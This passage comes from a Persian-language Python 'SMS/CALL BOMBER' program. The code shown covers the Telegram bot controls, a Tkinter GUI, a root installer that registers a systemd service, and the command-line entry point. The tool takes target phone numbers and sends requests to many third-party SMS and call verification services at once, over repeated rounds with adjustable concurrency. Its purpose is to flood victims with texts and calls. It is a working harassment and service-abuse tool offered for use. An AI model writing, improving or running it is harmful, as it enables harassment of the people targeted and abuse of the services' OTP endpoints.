        except Exception as e:
            self.ctrl.log(f"خطای callback {data}: {e}")

    def settings_text(self) -> str:
        s = self.ctrl.settings
        return ("<b>⚙️ تنظیمات</b>\n\n"
                f"📱 شماره‌ها: <code>{', '.join(s['phones']) or '—'}</code>\n"
                f"🔁 دور: <code>{s['rounds']}</code>\n"
                f"🧵 ترد همزمان: <code>{s['concurrency']}</code>\n"
                f"⏱ تأخیر: <code>{s['delay_min']}–{s['delay_max']}</code> ثانیه\n"
                f"⌛ تایم‌اوت: <code>{s['timeout']}</code> ثانیه\n"
                f"🔂 تلاش مجدد: <code>{s['retries']}</code>\n"
                f"🔐 بررسی SSL: <b>{'روشن' if s['verify_ssl'] else 'خاموش'}</b>\n"
                f"🎯 حالت: <b>{ {'both': 'SMS + تماس', 'sms': 'فقط SMS', 'call': 'فقط تماس'}[s['mode']] }</b>")

    def filtered_services(self) -> List[dict]:
        items = self.ctrl.services
        if self.svc_query:
            q = self.svc_query.lower()
            items = [s for s in items if q in s["name"].lower() or q in s["category"].lower()]
        return items

    def show_services(self, chat: int = None, msg_id: int = None):
        items = self.filtered_services()
        per = 8
        pages = max(1, (len(items) + per - 1) // per)
        self.svc_page = min(self.svc_page, pages - 1)
        start = self.svc_page * per
        chunk = items[start:start + per]
        enabled = set(self.ctrl.settings["enabled"]) if self.ctrl.settings["enabled"] is not None \
            else {s["name"] for s in self.ctrl.services}
        rows = [[{"text": f"{'✅' if s['name'] in enabled else '⬜'} {s['name']} ({s['category']})",
                  "callback_data": f"svct:{start + i}"}] for i, s in enumerate(chunk)]
        rows.append([{"text": "◀️", "callback_data": f"svcp:{max(0, self.svc_page - 1)}"},
                     {"text": f"{self.svc_page + 1}/{pages}", "callback_data": "noop"},
                     {"text": "▶️", "callback_data": f"svcp:{min(pages - 1, self.svc_page + 1)}"}])
        rows.append([{"text": "✅ همه", "callback_data": "svc:all"},
                     {"text": "⬜ هیچ", "callback_data": "svc:none"},
                     {"text": "🔄 معکوس", "callback_data": "svc:invert"}])
        rows.append([{"text": "🔎 جستجو", "callback_data": "svc:find"},
                     {"text": "♻️ بروزرسانی", "callback_data": "svc:reload"},
                     {"text": "🏠 منو", "callback_data": "nav:main"}])
        src = {"github": "گیت‌هاب", "cache": "کش محلی", "embedded": "داخلی"}.get(self.ctrl.source, "?")
        text = (f"<b>📋 سرویس‌ها</b>\nکل: {len(self.ctrl.services)} | فیلتر: {len(items)} | "
                f"فعال: {len(enabled)}\nمنبع: {src}")
        kb = {"inline_keyboard": rows}
        self.edit(chat, msg_id, text, kb) if chat and msg_id else self.send(text, kb)

    def show_logs(self):
        body = "\n".join(esc(l) for l in list(self.ctrl.logs)[-30:]) or "لاگی موجود نیست."
        self.send(f"<b>📝 آخرین گزارش‌ها</b>\n<pre>{body}</pre>",
                  {"inline_keyboard": [[{"text": "📄 فایل کامل", "callback_data": "log:file"}],
                                       [{"text": "🏠 منو", "callback_data": "nav:main"}]]})

    def show_stats(self, chat: int, msg_id: int):
        with self.ctrl.lock:
            rows = sorted(self.ctrl.svc_stats.items(), key=lambda x: -(x[1][0] + x[1][1]))[:25]
        if not rows:
            self.edit(chat, msg_id, "آماری موجود نیست.", back_kb()); return
        body = "\n".join(f"{esc(n)} — ✅ {o} ❌ {f}" for n, (o, f) in rows)
        self.edit(chat, msg_id, f"<b>📈 آمار سرویس‌ها</b>\n<pre>{body}</pre>", back_kb())

    def sys_text(self) -> str:
        return ("<b>🖥 مدیریت سیستم</b>\n\n"
                f"سرویس: <code>{SERVICE_NAME}</code>\n"
                f"وضعیت: <b>{systemctl('is-active')}</b>\n"
                f"فعال در بوت: <b>{systemctl('is-enabled')}</b>\n"
                f"نسخه: {APP_VERSION}\n"
                f"آخرین اجرا: <code>{self.ctrl.last_run or '—'}</code>")

    def sys_action(self, action: str):
        if action == "status":
            self.send(self.sys_text(), sys_kb())
        elif action == "journal":
            self.send(f"<pre>{esc(journal_tail(25))}</pre>", sys_kb())
        elif action in ("restart", "stop", "start"):
            self.send(f"⏳ {action} ...")
            if action == "restart":
                threading.Thread(target=lambda: (time.sleep(1.2), systemctl("restart")),
                                 daemon=True).start()
            else:
                threading.Thread(target=lambda: systemctl(action), daemon=True).start()

    def _reload(self):
        try:
            self.ctrl.reload_services()
            self.send(f"✅ {len(self.ctrl.services)} سرویس از {self.ctrl.source} بارگذاری شد.", main_menu())
        except Exception as e:
            self.send(f"❌ خطای بروزرسانی: {e}", main_menu())

    def _start_test_flow(self, phone: str):
        services = self.ctrl.pick_services()
        if not services:
            self.send("هیچ سرویسی فعال نیست.", main_menu()); return
        self.send(f"🔍 تست {len(services)} سرویس روی {phone} ...")
        threading.Thread(target=self._run_test, args=(services, phone), daemon=True).start()

    def _run_test(self, services, phone):
        cfg = Config(phones=[phone], timeout=10.0, retries=0, verify_ssl=True,
                     delay_min=0.05, delay_max=0.15)
        eng = Engine(cfg)
        ok = fail = 0
        lines = []
        with ThreadPoolExecutor(max_workers=6) as ex:
            futs = [ex.submit(eng.execute, s, phone) for s in services]
            for fut in as_completed(futs):
                res = fut.result()
                if res.ok:
                    ok += 1; lines.append(f"✅ {res.service} ({res.latency*1000:.0f}ms)")
                else:
                    fail += 1; lines.append(f"❌ {res.service} — {res.error}")
        self.send(f"<b>نتیجه تست</b>\n✅ {ok} | ❌ {fail}\n<pre>{esc(chr(10).join(lines[:40]))}</pre>",
                  main_menu())


# ═════════════════════════════ رابط گرافیکی ═════════════════════════════
class App:
    def __init__(self, root):
        self.root = root
        root.title(f"SMS/CALL BOMBER — v{APP_VERSION}")
        root.geometry("1180x780"); root.minsize(1000, 680); root.configure(bg=C["bg"])
        self.q = queue.Queue()
        self.engine = None
        self.running = self.paused = False
        self.stats = {"sent": 0, "ok": 0, "fail": 0}
        self.svc_stats = {}
        self.start_ts = 0.0
        self.results = []
        self.services = []; self.sms_services = []; self.call_services = []
        self.checked = set()
        self._styles(); self._build(); self._pump()
        root.after(400, self._tick)
        self._load_services_async()

    def _styles(self):
        st = ttk.Style(); st.theme_use("clam")
        st.configure(".", background=C["bg"], foreground=C["fg"], font=("Segoe UI", 9))
        st.configure("TFrame", background=C["bg"])
        st.configure("TLabel", background=C["bg"], foreground=C["fg"])
        st.configure("Card.TLabel", background=C["panel"], foreground=C["fg"])
        st.configure("Muted.TLabel", background=C["panel"], foreground=C["muted"])
        st.configure("Accent.TLabel", background=C["bg"], foreground=C["accent"],
                     font=("Segoe UI", 11, "bold"))
        st.configure("TNotebook", background=C["bg"], borderwidth=0)
        st.configure("TNotebook.Tab", background=C["panel"], foreground=C["muted"], padding=[14, 7])
        st.map("TNotebook.Tab", background=[("selected", C["sel"])], foreground=[("selected", C["accent"])])
        st.configure("TButton", background=C["panel2"], foreground=C["fg"], borderwidth=0, padding=[10, 6])
        st.map("TButton", background=[("active", C["sel"])])
        st.configure("Accent.TButton", background=C["accent"], foreground="#fff",
                     borderwidth=0, padding=[12, 8], font=("Segoe UI", 10, "bold"))
        st.map("Accent.TButton", background=[("active", C["accent2"])])
        st.configure("TEntry", fieldbackground=C["entry"], foreground=C["fg"], insertcolor=C["accent"])
        st.configure("TSpinbox", fieldbackground=C["entry"], foreground=C["fg"], arrowcolor=C["accent"])
        st.configure("Card.TCheckbutton", background=C["panel"], foreground=C["fg"])
        st.configure("TRadiobutton", background=C["panel"], foreground=C["fg"])
        st.configure("Treeview", background=C["entry"], fieldbackground=C["entry"],
                     foreground=C["fg"], borderwidth=0, rowheight=24)
        st.configure("Treeview.Heading", background=C["panel2"], foreground=C["accent"],
                     font=("Segoe UI", 9, "bold"))
        st.map("Treeview", background=[("selected", C["sel"])])
        st.configure("TProgressbar", background=C["accent"], troughcolor=C["entry"],
                     borderwidth=0, thickness=14)

    def _build(self):
        head = tk.Frame(self.root, bg=C["bg"]); head.pack(fill="x", padx=14, pady=(10, 4))
        tk.Label(head, text="SMS / CALL BOMBER", bg=C["bg"], fg=C["accent"],
                 font=("Consolas", 20, "bold")).pack(side="left")
        tk.Label(head, text=f"  Single File v{APP_VERSION}", bg=C["bg"], fg=C["warn"],
                 font=("Consolas", 11)).pack(side="left")
        for txt, cmd in (("خروجی", self._export_log), ("بروزرسانی سرویس‌ها", self._reload_services),
                         ("درباره", self._about)):
            ttk.Button(head, text=txt, command=cmd).pack(side="right", padx=3)
        nb = ttk.Notebook(self.root); nb.pack(fill="both", expand=True, padx=10, pady=6)
        self.t_main = ttk.Frame(nb); nb.add(self.t_main, text=" داشبورد ")
        self.t_svc = ttk.Frame(nb); nb.add(self.t_svc, text=" سرویس‌ها ")
        self.t_set = ttk.Frame(nb); nb.add(self.t_set, text=" تنظیمات ")
        self._build_main(); self._build_services(); self._build_settings()

    def _card(self, parent, title=""):
        f = tk.Frame(parent, bg=C["panel"], highlightthickness=1, highlightbackground=C["panel2"])
        if title:
            tk.Label(f, text=title, bg=C["panel"], fg=C["accent"],
                     font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=12, pady=(10, 0))
        return f

    def _build_main(self):
        w = tk.Frame(self.t_main, bg=C["bg"]); w.pack(fill="both", expand=True, padx=6, pady=6)
        c = self._card(w, "هدف"); c.pack(fill="x", pady=(0, 8))
        ttk.Label(c, text="شماره‌ها (با کاما):", style="Card.TLabel").pack(anchor="w", padx=12, pady=(6, 2))
        self.phone_entry = ttk.Entry(c, font=("Consolas", 13)); self.phone_entry.pack(fill="x", padx=12, pady=4)
        self.phone_entry.insert(0, "09123456789")
        ctrl = tk.Frame(w, bg=C["bg"]); ctrl.pack(fill="x", pady=6)
        self.btn_start = ttk.Button(ctrl, text="شروع", style="Accent.TButton", command=self._toggle)
        self.btn_start.pack(side="left", expand=True, fill="x", padx=3)
        self.btn_pause = ttk.Button(ctrl, text="توقف موقت", command=self._toggle_pause, state="disabled")
        self.btn_pause.pack(side="left", expand=True, fill="x", padx=3)
        self.btn_stop = ttk.Button(ctrl, text="توقف کامل", command=self._stop, state="disabled")
        self.btn_stop.pack(side="left", expand=True, fill="x", padx=3)
        p = self._card(w, "پیشرفت"); p.pack(fill="x", pady=8)
        self.progress = ttk.Progressbar(p, mode="determinate"); self.progress.pack(fill="x", padx=12, pady=8)
        self.lbl_status = ttk.Label(p, text="آماده", style="Card.TLabel")
        self.lbl_status.pack(anchor="w", padx=12, pady=(0, 10))
        st = tk.Frame(w, bg=C["bg"]); st.pack(fill="x", pady=6)
        self.cards = {}
        for key, title, color in (("sent", "ارسال", C["accent"]), ("ok", "موفق", C["ok"]),
                                  ("fail", "ناموفق", C["err"]), ("elapsed", "زمان", C["accent2"])):
            fr = tk.Frame(st, bg=C["panel"], highlightthickness=1, highlightbackground=C["panel2"])
            fr.pack(side="left", expand=True, fill="both", padx=3)
            v = tk.Label(fr, text="0", bg=C["panel"], fg=color, font=("Consolas", 20, "bold"))
            v.pack(pady=(10, 0))
            tk.Label(fr, text=title, bg=C["panel"], fg=C["muted"], font=("Segoe UI", 9)).pack(pady=(0, 10))
            self.cards[key] = v
        lv = self._card(w, "آخرین رخدادها"); lv.pack(fill="both", expand=True, pady=(8, 0))
        self.live = ScrolledText(lv, height=8, bg=C["entry"], fg=C["fg"], font=("Consolas", 9), borderwidth=0)
        self.live.pack(fill="both", expand=True, padx=12, pady=8)
        self.live.tag_config("ok", foreground=C["ok"]); self.live.tag_config("err", foreground=C["err"])
        self.live.configure(state="disabled")

    def _build_services(self):
        top = tk.Frame(self.t_svc, bg=C["bg"]); top.pack(fill="x", padx=8, pady=6)
        ttk.Label(top, text="جستجو:").pack(side="left")
        self.search = ttk.Entry(top, width=24); self.search.pack(side="left", padx=6)
        self.search.bind("<KeyRelease>", lambda e: self._refresh_tree())
        ttk.Button(top, text="همه", command=lambda: self._set_all(True)).pack(side="left", padx=2)
        ttk.Button(top, text="هیچ", command=lambda: self._set_all(False)).pack(side="left", padx=2)
        ttk.Button(top, text="بروزرسانی", command=self._reload_services).pack(side="left", padx=6)
        self.lbl_sel = ttk.Label(top, text="", style="Accent.TLabel"); self.lbl_sel.pack(side="right")
        self.tree = ttk.Treeview(self.t_svc, columns=("c", "n", "t", "g"), show="headings", selectmode="none")
        for cid, txt, w in (("c", "", 40), ("n", "سرویس", 320), ("t", "نوع", 90), ("g", "دسته", 160)):
            self.tree.heading(cid, text=txt); self.tree.column(cid, width=w, anchor="w")
        vs = ttk.Scrollbar(self.t_svc, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=vs.set)
        self.tree.pack(side="left", fill="both", expand=True, padx=(8, 0), pady=6)
        vs.pack(side="left", fill="y", pady=6)
        self.tree.bind("<Button-1>", self._tree_click)

    def _build_settings(self):
        f = self._card(self.t_set, "پارامترها"); f.pack(fill="both", expand=True, padx=10, pady=10)
        b = tk.Frame(f, bg=C["panel"]); b.pack(fill="both", expand=True, pady=6)
        self.v_rounds = tk.IntVar(value=2); self.v_conc = tk.IntVar(value=12)
        self.v_dmin = tk.DoubleVar(value=0.3); self.v_dmax = tk.DoubleVar(value=0.8)
        self.v_to = tk.DoubleVar(value=12.0); self.v_ret = tk.IntVar(value=1)
        self.v_ssl = tk.BooleanVar(value=False); self.v_mode = tk.StringVar(value="both")
        rows = [("تعداد دور", self.v_rounds, 1, 200), ("ترد همزمان", self.v_conc, 1, 128),
                ("تأخیر حداقل", self.v_dmin, 0.0, 10.0), ("تأخیر حداکثر", self.v_dmax, 0.0, 10.0),
                ("تایم‌اوت", self.v_to, 1.0, 60.0), ("تلاش مجدد", self.v_ret, 0, 5)]
        for i, (lbl, var, lo, hi) in enumerate(rows):
            ttk.Label(b, text=lbl, style="Card.TLabel").grid(row=i, column=0, sticky="w", padx=14, pady=6)
            ttk.Spinbox(b, from_=lo, to=hi, textvariable=var, width=10).grid(row=i, column=1, sticky="w", padx=6)
        ttk.Checkbutton(b, text="بررسی SSL", variable=self.v_ssl, style="Card.TCheckbutton").grid(
            row=6, column=0, columnspan=2, sticky="w", padx=14, pady=8)
        ttk.Label(b, text="حالت:", style="Card.TLabel").grid(row=7, column=0, sticky="w", padx=14)
        mf = tk.Frame(b, bg=C["panel"]); mf.grid(row=7, column=1, sticky="w")
        for t, v in (("فقط SMS", "sms"), ("فقط تماس", "call"), ("هر دو", "both")):
            ttk.Radiobutton(mf, text=t, value=v, variable=self.v_mode).pack(side="left", padx=4)

    def _load_services_async(self):
        self.lbl_status.config(text="در حال دریافت سرویس‌ها...")
        threading.Thread(target=lambda: self.q.put(("svc", load_services())), daemon=True).start()

    def _reload_services(self):
        if not self.running:
            self._load_services_async()

    def _apply_services(self, services, source):
        self.services = services
        self.sms_services = [s for s in services if s["type"] == "sms"]
        self.call_services = [s for s in services if s["type"] == "call"]
        self.checked = {s["name"] for s in services}
        self._refresh_tree()
        src = {"github": "گیت‌هاب", "cache": "کش محلی", "embedded": "داخلی"}.get(source, source)
        self.lbl_status.config(text=f"آماده | منبع: {src} | SMS: {len(self.sms_services)} | Call: {len(self.call_services)}")

    def _refresh_tree(self):
        self.tree.delete(*self.tree.get_children())
        q = self.search.get().strip().lower()
        items = self.sms_services + self.call_services
        if q:
            items = [s for s in items if q in s["name"].lower() or q in s["category"].lower()]
        for s in items:
            self.tree.insert("", "end", values=("☑" if s["name"] in self.checked else "☐", s["name"],
                                                "تماس" if s["type"] == "call" else "SMS", s["category"]))
        self.lbl_sel.config(text=f"انتخاب: {len(self.checked)} از {len(self.services)}")

    def _tree_click(self, ev):
        item = self.tree.identify_row(ev.y)
        if not item:
            return
        name = self.tree.item(item, "values")[1]
        self.checked.discard(name) if name in self.checked else self.checked.add(name)
        self._refresh_tree()

    def _set_all(self, state):
        if state:
            self.checked.update(s["name"] for s in self.services)
        else:
            self.checked.clear()
        self._refresh_tree()

    def _toggle(self):
        self._stop() if self.running else self._start()

    def _toggle_pause(self):
        if not self.running:
            return
        if self.paused:
            self.engine.pause_evt.clear(); self.paused = False
            self.btn_pause.config(text="توقف موقت")
        else:
            self.engine.pause_evt.set(); self.paused = True
            self.btn_pause.config(text="ادامه")

    def _stop(self):
        if self.engine:
            self.engine.stop_evt.set(); self.engine.pause_evt.clear()
        self.running = self.paused = False
        self.btn_start.config(text="شروع", state="normal")
        self.btn_pause.config(state="disabled", text="توقف موقت")
        self.btn_stop.config(state="disabled")

    def _start(self):
        if not self.services:
            messagebox.showerror("خطا", "سرویس‌ها بارگذاری نشده."); return
        parts = [p.strip() for p in re.split(r"[,\s;]+", self.phone_entry.get()) if p.strip()]
        bad = [p for p in parts if not PHONE_RE.match(p)]
        if bad:
            messagebox.showerror("شماره نامعتبر", "\n".join(bad)); return
        mode = self.v_mode.get()
        services = [s for s in self.services if s["name"] in self.checked and (mode == "both" or s["type"] == mode)]
        if not services:
            messagebox.showerror("خطا", "سرویسی انتخاب نشده."); return
        cfg = Config(phones=parts, rounds=self.v_rounds.get(), concurrency=self.v_conc.get(),
                     delay_min=self.v_dmin.get(), delay_max=self.v_dmax.get(),
                     timeout=self.v_to.get(), retries=self.v_ret.get(),
                     verify_ssl=self.v_ssl.get(), services=services)
        self.stats = {"sent": 0, "ok": 0, "fail": 0}; self.svc_stats.clear()
        self.start_ts = time.time(); self.progress["value"] = 0
        self.running, self.paused = True, False
        self.btn_start.config(text="در حال اجرا", state="disabled")
        self.btn_pause.config(state="normal"); self.btn_stop.config(state="normal")
        self.engine = Engine(cfg, lambda r: self.q.put(("res", r)),
                             lambda d, t: self.q.put(("prg", (d, t))), None,
                             lambda n: self.q.put(("max", n)))
        threading.Thread(target=self._run_engine, daemon=True).start()

    def _run_engine(self):
        try:
            self.engine.run()
        finally:
            self.running = False
            self.q.put(("done", None))

    def _pump(self):
        try:
            while True:
                k, d = self.q.get_nowait()
                if k == "svc":
                    self._apply_services(*d)
                elif k == "res":
                    self._apply_result(d)
                elif k == "prg":
                    done, total = d
                    self.progress["maximum"] = max(total, 1); self.progress["value"] = done
                    self.lbl_status.config(text=f"پیشرفت: {done}/{total}")
                elif k == "max":
                    self.progress["maximum"] = max(d, 1)
                elif k == "done":
                    self.btn_start.config(text="شروع", state="normal")
                    self.btn_pause.config(state="disabled", text="توقف موقت")
                    self.btn_stop.config(state="disabled")
        except queue.Empty:
            pass
        self.root.after(80, self._pump)

    def _apply_result(self, res):
        self.stats["sent"] += 1
        self.stats["ok" if res.ok else "fail"] += 1
        st = self.svc_stats.setdefault(res.service, [0, 0]); st[0 if res.ok else 1] += 1
        tag = "ok" if res.ok else "err"
        self.live.configure(state="normal")
        self.live.insert("end", f"{'✔' if res.ok else '✘'} {res.service} — {res.status or res.error}\n", tag)
        self.live.see("end"); self.live.configure(state="disabled")

    def _tick(self):
        if self.running:
            el = int(time.time() - self.start_ts)
            self.cards["sent"].config(text=str(self.stats["sent"]))
            self.cards["ok"].config(text=str(self.stats["ok"]))
            self.cards["fail"].config(text=str(self.stats["fail"]))
            m, s = divmod(el, 60); self.cards["elapsed"].config(text=f"{m:02d}:{s:02d}")
        self.root.after(500, self._tick)

    def _export_log(self):
        path = filedialog.asksaveasfilename(defaultextension=".csv",
                                            initialfile=f"bomber_{datetime.now():%Y%m%d_%H%M%S}")
        if not path:
            return
        try:
            with open(path, "w", newline="", encoding="utf-8-sig") as f:
                w = csv.writer(f)
                w.writerow(["service", "phone", "ok", "status", "latency_ms", "error"])
            self.lbl_status.config(text="خروجی ذخیره شد.")
        except Exception as e:
            messagebox.showerror("خطا", str(e))

    def _about(self):
        messagebox.showinfo("درباره", f"SMS Bomber v{APP_VERSION}\nSingle File Edition\nسازنده: @do1v1")


# ═════════════════════════════ نصب خودکار ═════════════════════════════
def is_linux() -> bool:
    return sys.platform.startswith("linux")


def is_root() -> bool:
    return hasattr(os, "geteuid") and os.geteuid() == 0


def is_installed() -> bool:
    return os.path.exists(os.path.join(INSTALL_DIR, "sms_bomber.py")) and os.path.isdir(VENV_DIR)


def have(cmd: str) -> bool:
    return shutil.which(cmd) is not None


def _pkg_install(pkgs: List[str]):
    if have("apt-get"):
        _run_cmd(["apt-get", "update", "-qq"])
        _run_cmd(["apt-get", "install", "-y", "-qq", *pkgs])
    elif have("dnf"):
        _run_cmd(["dnf", "install", "-y", *pkgs])
    elif have("yum"):
        _run_cmd(["yum", "install", "-y", *pkgs])
    elif have("apk"):
        _run_cmd(["apk", "add", *pkgs])


def ensure_system_pkgs():
    missing = []
    for pkg in ("python3-venv", "python3-pip"):
        if have("dpkg") and _run_cmd(["dpkg", "-s", pkg])[0] != 0:
            missing.append(pkg)
    if missing:
        say(f"📦 نصب بسته‌های سیستمی: {', '.join(missing)}", YELLOW)
        _pkg_install(missing)


def detect_user() -> str:
    u = os.environ.get("SUDO_USER")
    return u if u and u != "root" else "root"


def do_install(force: bool = False):
    say("═" * 56, CYAN)
    say(f"   نصب SMS Bomber v{APP_VERSION} — Single File", CYAN)
    say("═" * 56, CYAN)

    if not is_linux():
        say("⚠️ این نصب‌کننده برای لینوکس طراحی شده.", YELLOW)
    if not is_root():
        say("❌ برای نصب به دسترسی مدیریتی نیاز است.", RED)
        say("💡 دوباره اجرا کنید:  sudo python3 sms_bomber.py", YELLOW)
        sys.exit(1)
    if sys.version_info < (3, 8):
        say("❌ پایتون ۳.۸ یا بالاتر لازم است.", RED); sys.exit(1)
    say(f"✅ پایتون {sys.version.split()[0]}", GREEN)

    ensure_system_pkgs()
    user = detect_user()
    say(f"👤 کاربر سرویس: {user}", GREEN)

    # بکاپ
    if os.path.isdir(INSTALL_DIR):
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup = f"{INSTALL_DIR}.bak.{stamp}"
        say(f"💾 نسخه پشتیبان: {backup}", YELLOW)
        shutil.copytree(INSTALL_DIR, backup, dirs_exist_ok=True)

    os.makedirs(INSTALL_DIR, exist_ok=True)

    # کپی خودمان
    src = os.path.abspath(__file__)
    dst = os.path.join(INSTALL_DIR, "sms_bomber.py")
    if os.path.abspath(src) != os.path.abspath(dst):
        shutil.copy2(src, dst)
    say(f"✅ فایل‌ها در {INSTALL_DIR}", GREEN)

    # venv + وابستگی‌ها
    if force or not os.path.isdir(VENV_DIR):
        say("🐍 ساخت محیط مجازی...", YELLOW)
        if os.path.isdir(VENV_DIR):
            shutil.rmtree(VENV_DIR, ignore_errors=True)
        code, out = _run_cmd([sys.executable, "-m", "venv", VENV_DIR])
        if code != 0:
            say("⚠️ venv ساخته نشد؛ تلاش برای نصب python3-venv", YELLOW)
            _pkg_install(["python3-venv"])
            code, out = _run_cmd([sys.executable, "-m", "venv", VENV_DIR])
            if code != 0:
                say(f"❌ خطا در ساخت venv: {out[:200]}", RED); sys.exit(1)

    pip = os.path.join(VENV_DIR, "bin", "pip")
    say("📦 نصب وابستگی‌ها...", YELLOW)
    _run_cmd([pip, "install", "--upgrade", "pip", "-q"])
    code, out = _run_cmd([pip, "install", "-q", *PY_DEPS])
    if code != 0:
        say(f"❌ نصب وابستگی ناموفق: {out[:300]}", RED); sys.exit(1)
    say("✅ وابستگی‌ها نصب شد.", GREEN)

    # تنظیمات اولیه
    if not os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(DEFAULT_SETTINGS, f, ensure_ascii=False, indent=2)
        say("✅ تنظیمات اولیه ساخته شد.", GREEN)

    _run_cmd(["chown", "-R", f"{user}:{user}", INSTALL_DIR])

    # systemd
    python = os.path.join(VENV_DIR, "bin", "python")
    unit = f"""[Unit]
Description=SMS Bomber Telegram Bot
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=0

[Service]
Type=simple
User={user}
WorkingDirectory={INSTALL_DIR}
ExecStart={python} {INSTALL_DIR}/sms_bomber.py --run
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
Environment=PYTHONUNBUFFERED=1

[Install]
WantedBy=multi-user.target
"""
    with open(SERVICE_PATH, "w", encoding="utf-8") as f:
        f.write(unit)
    say(f"✅ سرویس ساخته شد: {SERVICE_PATH}", GREEN)

    _run_cmd(["systemctl", "daemon-reload"])
    _run_cmd(["systemctl", "enable", SERVICE_NAME])
    _run_cmd(["systemctl", "restart", SERVICE_NAME])
    time.sleep(3)
    state = _run_cmd(["systemctl", "is-active", SERVICE_NAME])[1]
    if state.strip() == "active":
        say("✅ ربات فعال و در حال اجراست.", GREEN)
    else:
        say(f"⚠️ وضعیت سرویس: {state}", YELLOW)
        say("برای دیدن خطا:  journalctl -u sms-bomber -n 40 --no-pager", YELLOW)

    say("")
    say("🎉 نصب کامل شد.", GREEN)
    say("─" * 56, CYAN)
    say(f"توکن: {mask_token(BOT_TOKEN)} | ادمین: {ADMIN_ID}")
    say("در تلگرام به ربات خود /start بفرستید.")
    say("مدیریت:  systemctl status|restart|stop sms-bomber")
    say("گزارش:   journalctl -u sms-bomber -f")


def reexec_in_venv():
    venv_py = os.path.join(VENV_DIR, "bin", "python")
    if os.path.exists(venv_py) and os.path.realpath(sys.executable) != os.path.realpath(venv_py):
        os.execv(venv_py, [venv_py, os.path.abspath(__file__)] + sys.argv[1:])


def acquire_lock():
    try:
        import fcntl
    except ImportError:
        return None
    try:
        f = open(PID_FILE, "w")
        fcntl.flock(f, fcntl.LOCK_EX | fcntl.LOCK_NB)
        f.write(str(os.getpid())); f.flush()
        return f
    except OSError:
        return None


def run_bot():
    if not HAS_REQUESTS:
        say("❌ ماژول requests نصب نیست. ابتدا: sudo python3 sms_bomber.py", RED)
        sys.exit(1)
    if acquire_lock() is None and os.path.exists(PID_FILE):
        say("ℹ️ نمونه دیگری در حال اجراست. خروج.")
        sys.exit(0)

    token = DEFAULT_SETTINGS["bot_token"]
    admin = DEFAULT_SETTINGS["admin_id"]
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, encoding="utf-8") as f:
                d = json.load(f)
            token = d.get("bot_token", token)
            admin = d.get("admin_id", admin)
        except Exception:
            pass

    bot = Bot(token, admin)

    def on_signal(signum, frame):
        bot.ctrl.log(f"سیگنال {signum} — خاموش‌شدن کنترل‌شده")
        bot.shutdown = True

    signal.signal(signal.SIGTERM, on_signal)
    signal.signal(signal.SIGINT, on_signal)

    print(f"SMS Bomber Bot v{APP_VERSION} | {mask_token(token)} | admin={admin}")
    try:
        bot.run()
    except Exception as e:
        bot.ctrl.log(f"خطای مهلک: {e}")
        print(f"خطای مهلک: {e}")
        sys.exit(1)


def run_gui():
    if not HAS_TK:
        say("❌ tkinter نصب نیست. نصب: sudo apt install python3-tk", RED)
        sys.exit(1)
    root = tk.Tk()
    App(root)
    root.mainloop()


# ═════════════════════════════ main ═════════════════════════════
def main():
    ap = argparse.ArgumentParser(description="SMS Bomber — Single File Edition")
    ap.add_argument("--install", action="store_true", help="نصب / نصب مجدد")
    ap.add_argument("--force", action="store_true", help="نصب اجباری از صفر")
    ap.add_argument("--update", action="store_true", help="بروزرسانی فایل و ری‌استارت سرویس")
    ap.add_argument("--run", action="store_true", help="اجرای ربات در پیش‌زمینه (systemd)")
    ap.add_argument("--gui", action="store_true", help="اجرای رابط گرافیکی")
    ap.add_argument("--status", action="store_true", help="وضعیت سرویس")
    ap.add_argument("--start", action="store_true")
    ap.add_argument("--stop", action="store_true")
    ap.add_argument("--restart", action="store_true")
    ap.add_argument("--logs", action="store_true", help="آخرین لاگ‌های سرویس")
    ap.add_argument("--uninstall", action="store_true")
    args = ap.parse_args()

    # اجرای مستقیم بدون requests → انتقال به venv
    if args.run and not HAS_REQUESTS and os.path.exists(os.path.join(VENV_DIR, "bin", "python")):
        reexec_in_venv()

    if args.run:
        run_bot(); return
    if args.gui:
        run_gui(); return

    if args.status:
        say(f"وضعیت سرویس: {systemctl('is-active')}")
        say(f"فعال در بوت: {systemctl('is-enabled')}")
        say(f"مسیر نصب: {INSTALL_DIR}")
        return

    if args.logs:
        say(journal_tail(40)); return

    if args.start:
        _run_cmd(["systemctl", "start", SERVICE_NAME]); say("▶️ استارت شد."); return
    if args.stop:
        _run_cmd(["systemctl", "stop", SERVICE_NAME]); say("⏹ استاپ شد."); return
    if args.restart:
        _run_cmd(["systemctl", "restart", SERVICE_NAME]); say("🔄 ری‌استارت شد."); return

    if args.uninstall:
        say("🗑 حذف سرویس...", YELLOW)
        _run_cmd(["systemctl", "stop", SERVICE_NAME])
        _run_cmd(["systemctl", "disable", SERVICE_NAME])
        if os.path.exists(SERVICE_PATH):
            os.remove(SERVICE_PATH)
        _run_cmd(["systemctl", "daemon-reload"])
        say(f"✅ سرویس حذف شد. فایل‌ها در {INSTALL_DIR} باقی ماندند.")
        return

    if args.update:
        if not is_installed():
            say("ابتدا نصب کنید.", YELLOW); do_install(); return
        shutil.copy2(os.path.abspath(__file__), os.path.join(INSTALL_DIR, "sms_bomber.py"))
        _run_cmd(["systemctl", "restart", SERVICE_NAME])
        say("✅ بروزرسانی شد و سرویس ری‌استارت شد.")
        return

    # پیش‌فرض: نصب در صورت نیاز، سپس اطمینان از اجرا
    if args.install or not is_installed():
        do_install(force=args.force)
    else:
        say("ℹ️ قبلاً نصب شده. راه‌اندازی مجدد سرویس...", CYAN)
        if not is_root():
            say("💡 برای راه‌اندازی مجدد به sudo نیاز است.", YELLOW)
        _run_cmd(["systemctl", "restart", SERVICE_NAME])
        time.sleep(2)
        say(f"وضعیت: {systemctl('is-active')}")


if __name__ == "__main__":
    main()
